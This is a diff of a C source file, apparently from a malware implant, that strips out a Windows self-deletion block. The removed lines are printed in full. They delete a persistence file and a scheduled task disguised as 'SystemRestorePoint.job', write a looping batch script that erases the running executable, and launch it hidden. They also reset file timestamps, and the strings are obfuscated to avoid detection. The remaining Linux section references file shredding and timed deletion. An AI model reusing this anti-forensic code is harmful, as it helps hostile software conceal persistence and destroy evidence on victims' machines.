@@ -10,17 +10,11 @@
 #include "compat.h"
 #include "proj_strings.h"
 
-
-#ifndef WIN32
 #include <unistd.h>
 #include <fcntl.h>
 #include <time.h>
 #include <utime.h>
 #define _stat stat
-#else
-#undef _stat
-int _stat(const char *path, struct stat *buffer);
-#endif
 
 void check_timer(char* filepath, unsigned long delete_delay)
 {
@@ -64,65 +58,7 @@ void check_timer(char* filepath, unsigned long delete_delay)
 }
 
 
-#if defined WIN32
-#include <Windows.h>
-
-void self_delete()
-{
-	FILE* file;
-//	char* line1 = ":rp\n";
-	char* line1 = sdw1;
-	char line2[MAX_PATH];
-	char line3[MAX_PATH];
-//	char* line4 = "del \"deleter.bat\"\n";
-	char* line4 = sdw4;
-	char* expandedfile;
-
-	//DeleteFile("c:\\windows\\uninstallreadme.txt");//CHANGED!!!!
-	expandedfile = (char*)malloc(MAX_PATH);
-	memset(expandedfile, 0, MAX_PATH);
-	ExpandEnvironmentStringsA(sdwtf, expandedfile, MAX_PATH);
-	SetFileAttributes(expandedfile, FILE_ATTRIBUTE_NORMAL);
-	DeleteFile(expandedfile);
-	free(expandedfile);
-	//DeleteFile("c:\\windows\\Tasks\\SystemRestorePoint.job");//CHANGED!!!!
-	expandedfile = (char*)malloc(MAX_PATH);
-	memset(expandedfile, 0, MAX_PATH);
-	ExpandEnvironmentStringsW(	sresjBa12p, expandedfile, MAX_PATH);
-	SetFileAttributesW(expandedfile, FILE_ATTRIBUTE_NORMAL);
-	DeleteFileW(expandedfile);
-	free(expandedfile);
-
-//	sprintf(line2,"del \"%s\" \n",exe_path);
-	sprintf(line2,sdw2,exe_path);
-//	sprintf(line3,"if exist \"%s\" goto rp\n",exe_path);
-	sprintf(line3,sdw3,exe_path);
-
-//	file = fopen("deleter.bat", "w");
-	file = fopen(sdwsn, "w");
-	fwrite(line1,strlen(line1),1,file);
-	fwrite(line2,strlen(line2),1,file);
-	fwrite(line3,strlen(line3),1,file);
-	fwrite(line4,strlen(line4),1,file);
-	fclose(file);
-
-//	ShellExecute(0,0,"deleter.bat","\\",0,SW_HIDE);
-	ShellExecute(0,0,sdwsn,"\\",0,SW_HIDE);
-}
-
-void update_file(char* filepath)
-{
-	FILETIME ft;
-	SYSTEMTIME st;
-	HANDLE hFile;
-
-	hFile = CreateFile(filepath,GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_WRITE_ACCESS,NULL);
-	GetSystemTime(&st);
-	SystemTimeToFileTime(&st,&ft);
-	SetFileTime(hFile, &ft, &ft, &ft);
-	CloseHandle(hFile);
-}
-#elif defined LINUX
+#if defined LINUX
 static int shred_file(char* filename);
 
 
@@ -343,4 +279,3 @@ void markTermination(char* filepath)
 	return; 
 }
 #endif
-
